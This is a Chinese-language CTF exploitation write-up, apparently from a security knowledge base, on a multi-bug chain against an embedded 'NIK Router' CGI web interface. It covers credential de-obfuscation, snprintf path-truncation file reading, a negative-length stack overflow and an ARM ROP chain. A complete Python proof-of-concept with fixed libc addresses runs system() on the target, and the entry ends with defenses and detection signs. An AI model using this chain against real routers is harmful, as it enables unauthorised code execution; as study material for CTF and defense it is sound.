---
id: binary-pwn-stack-nik-router-cgi-shm-negative-len-arm-rop
title: NIK Router CGI 组合链：凭据解密 + snprintf 目录截断读 rootkey + 共享内存字符逃逸 + ARM 栈溢出 ROP
type: scenario
domain: binary
path: binary/pwn/stack
technique: embedded-cgi-shm-negative-length-stack-overflow-arm-rop
aliases:
- NIK Router RCE
- CGI 多漏洞组合链
- shmmemdump 负数长度栈溢出
- snprintf 目录截断绕过后缀
- 共享内存字符逃逸
tags:
- iot
- router
- lighttpd
- cgi
- arm
- stack-overflow
- rop
- shared-memory
- snprintf
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V131
  verified_at: '2026-11-06T05:36:31+08:00'
  notes: 已对照原文与全部25张图片核对：auth.cgi 的 N1K_ROUT3R 循环XOR+base64 凭据还原可复算（admin/8g323##a08h33zx33@!B!$$$$$$$）、upload.cgi 0x60 snprintf 截断路径构造（./*41+/rootkeynik.gif 截断后为 /tmp/rootkey）、watch 生成64字节rootkey、lang.cgi setid=-1、set_publicfile cnt1/cnt2 逐字节写 store_shm、ARM ROP 地址与 pwndbg 栈布局一致；CTF 环境未独立复现，无 CVE/版本。
---

## 一句话结论

在 NIK Router 这类嵌入式 lighttpd + CGI 管理面上，先用可逆混淆的 admin 凭据登录，再以 `snprintf` 目录截断绕过 `nik.gif` 后缀检查读出 `/tmp/rootkey`，用 `lang.cgi` 把 id 改成负数，最后经 `upload_pubkey`/`set_publicfile` 的字符逃逸把 ARM ROP 链逐字节写进共享内存，触发 `manage.cgi` 中按负数长度 `memcpy` 的栈溢出，`system()` 执行命令拿到 flag。

## 原理

- **凭据可逆**：`auth.cgi` 从 `/tmp/store/users.txt` 读取 `admin:<base64>`，把用户输入口令用 10 字节硬编码 key `N1K_ROUT3R` 做循环 XOR 后再做自定义 base64，与文件中密文 `strcmp`。XOR+base64 只是混淆，密钥在二进制里，逆运算即可还原明文口令。
- **目录截断绕过后缀**：`upload.cgi` 的 `download` 分支先 `check_suffix(filepath, "nik.gif")`，再 `snprintf(pk_filename, 0x60, "/tmp/%s", filepath)`。校验看的是完整 `filepath`，而 `snprintf` 按 0x60 截断，构造 `./` 重复填充的路径使 `nik.gif` 恰好被截掉，实际打开的是 `/tmp/rootkey`（`/tmp/././.../rootkey` 等价于 `/tmp/rootkey`），且只输出大小为 64 字节的文件。
- **rootkey 来源**：`watch` 会生成 64 字节内容写入 `/tmp/rootkey.<pid>` 再 `rename` 为 `/tmp/rootkey` 并 `chmod 0600`。该内容即 `manage.cgi` 特权模式要求的 `niksessid`，通过上面的截断读取即可获得。
- **负数长度栈溢出**：`manage.cgi` 在 `rk` 与 `/tmp/rootkey` 相等时进入 `rootkey_privileged_mode()`；其中用 `tv.tv_usec & 1` 作为函数指针数组下标，取值恒为 0/1，必然调用 `sub_9FD0`。`sub_9FD0` 从 `/tmp/store/id.txt` 读入 `int v16`，再通过 `(uint8)v16 ^ 0x13 & 1` 选一个 memcpy 类函数，并把 `v16` 当作无符号长度传入；`id` 为负数时长度变成极大值，目标 `v19` 是栈缓冲区，形成栈溢出。`lang.cgi` 的 `setid` 字段可直接把 `-1` 写进 `id.txt`。
- **字符逃逸写共享内存**：`upload.cgi` 的 `upload_pubkey` 把十六进制文本写入 `/tmp/store/publicfile.txt`；`manage.cgi` 的 `set_publicfile` 先做小写化/过滤，再把 hex 转字节。循环在 `idx == 80` 时直接执行 `final_data[81] = chunk[80]` 并 break，绕过前面的字符检查；随后 `cnt1=80, cnt2=<offset>` 会把 `final_data[81]` 写到 `shm_ptr + offset`，从而把任意字节（包括 ROP 地址中的非可见字符）逐字节写进 `/store_shm` 共享内存。
- **ROP**：目标为 32 位 ARM（armel），无 PIE/ASLR 时 libc 基址固定，可直接用 `pop {lr}; bx lr`、`pop {r0, lr}; bx lr`、`system` 组成链，命令字符串放在共享内存固定地址，作为 `system` 参数。

## 触发条件

- 设备暴露 lighttpd 管理面，CGI 包含 `auth.cgi`、`manage.cgi`、`upload.cgi`、`lang.cgi`、`watch`，且 `watch` 可未授权访问生成 `/tmp/rootkey`。
- 能读取 `/tmp/store/users.txt` 或已知密文格式，并可从二进制中取得 XOR key。
- `upload.cgi` 的 `download` 路径存在固定长度 `snprintf` 截断，且后缀检查在截断前执行。
- `manage.cgi` 特权模式仅以 `/tmp/rootkey` 内容做口令，且 `id.txt` 可由 `lang.cgi` 写入负数。
- 目标无 PIE/ASLR（或已获得 libc 基址），且共享内存地址可预测；本例 libc 基址 `0xb6e8f000`、`/store_shm` 映射在 `0xb6ffc000`。

## 利用步骤

1. 解密 admin 口令：base64 解码 `users.txt` 中的密文，再按 `N1K_ROUT3R` 循环 XOR，得到 `admin/8g323##a08h33zx33@!B!$$$$$$$`。
2. 用该口令 POST `/cgi-bin/auth.cgi` 登录，取得 `SID`。
3. GET `/cgi-bin/watch` 生成 `/tmp/rootkey`。
4. GET `/cgi-bin/upload.cgi?action=download&path=./.../rootkeynik.gif`，利用 0x60 截断读出 64 字节 rootkey。
5. GET `/cgi-bin/lang.cgi?setid=-1`，把负数 id 写入 `/tmp/store/id.txt`。
6. 循环写入 ROP：每次 `POST /cgi-bin/upload.cgi`（`action=upload_pubkey`，`filecontent="00"*80 + <byte_hex>*2`），再 `GET /cgi-bin/manage.cgi?action=set_publicfile&cnt1=80&cnt2=<i>`，把第 i 个字节写到共享内存偏移 i。
7. GET `/cgi-bin/manage.cgi?action=manage&rk=<rootkey>` 触发特权模式与栈溢出，ROP 调 `system("cat /home/ctf/flag > /tmp/store/logs.txt")`。
8. 重新登录后 GET `/cgi-bin/manage.cgi?action=logs` 读取 `/tmp/store/logs.txt` 中的 flag。

## PoC

```python
import base64, requests
from pwn import p32

BASE = "http://127.0.0.1:8800"
s = requests.Session()

# 1) 还原 admin 口令（XOR key 位于 auth.cgi 中）
enc = base64.b64decode("dlZ4bWFsdjUDaiYCeCUqfGYUEhBvFW97dmtxcA==")
pw = bytes(b ^ b"N1K_ROUT3R"[i % 10] for i, b in enumerate(enc)).rstrip(b"\x00").decode()

# 2) 登录
s.post(f"{BASE}/cgi-bin/auth.cgi", data={"username": "admin", "password": pw})

# 3) 生成 /tmp/rootkey，并用 snprintf 截断读取
s.get(f"{BASE}/cgi-bin/watch")
rootkey = s.get(f"{BASE}/cgi-bin/upload.cgi",
                params={"action": "download", "path": "./" * 41 + "/rootkeynik.gif"}).text

# 4) id 置为 -1，使 memcpy 长度变为极大值
s.get(f"{BASE}/cgi-bin/lang.cgi", params={"setid": "-1"})

# 5) 逐字节把 ARM ROP 链写进 /store_shm
libc = 0xb6e8f000
shm  = 0xb6ffc000
args = shm + 0x24 + 0x4 * (3 + 1)
rop  = b"a" * 0x24
rop += p32(0x15b24 + libc) + p32(0x10c730 + libc) + p32(args) + p32(0x38d34 + libc)
rop += b"cat /home/ctf/flag > /tmp/store/logs.txt\x00"
for i, b in enumerate(rop):
    s.post(f"{BASE}/cgi-bin/upload.cgi",
           data={"action": "upload_pubkey", "filecontent": "00" * 80 + f"{b:02x}" * 2})
    s.get(f"{BASE}/cgi-bin/manage.cgi",
          params={"action": "set_publicfile", "cnt1": 80, "cnt2": i})

# 6) 触发栈溢出
s.get(f"{BASE}/cgi-bin/manage.cgi", params={"action": "manage", "rk": rootkey})

# 7) 重新登录后读日志拿 flag
s.post(f"{BASE}/cgi-bin/auth.cgi", data={"username": "admin", "password": pw})
print(s.get(f"{BASE}/cgi-bin/manage.cgi", params={"action": "logs"}).text)
```

## 变体与关联

- 变体：若 `id.txt` 只能写入正整数，可寻找其他有符号/无符号转换点，把长度变量污染成极大值。
- 变体：共享内存写入点若不支持任意字节，可用 `%`、`+` 等编码或分块覆盖，把 ROP 链拆成可打印片段。
- 变体：有 PIE/ASLR 时先通过 CGI 泄露/信息泄露获取 libc 基址，再复用同一链。
- 关联：[[binary-pwn-stack-dir505-my-cgi-content-length-overflow-mipseb-rop]]、[[binary-pwn-stack-mips-hedwig-cgi-uid-rop]]、[[binary-pwn-stack-snprintf-return-length-read-overflow]]、[[iot-protocol-dlink-dir645-ssdpcgi-command-injection]]。

## 检测与防御

- 凭据不要用固定 XOR+base64 混淆，改用加盐哈希；管理面强制强口令并限制来源。
- 路径处理先 `realpath` 规范化再做后缀检查，避免“检查用原串、打开用截断串”；不要用固定大小 `snprintf` 拼接后直接打开。
- `id.txt` 等外部输入做范围校验（非负、上限），memcpy 长度必须与目标缓冲区大小比较。
- 编译时开启 PIE/ASLR/栈保护，CGI 以最小权限运行，管理接口与业务面隔离。
- 检测：下载请求中出现大量 `./` 且以 `nik.gif` 结尾、`/tmp/rootkey` 被创建/读取、`setid` 为负数、CGI 异常崩溃与 `logs` 中出现外泄文件内容。
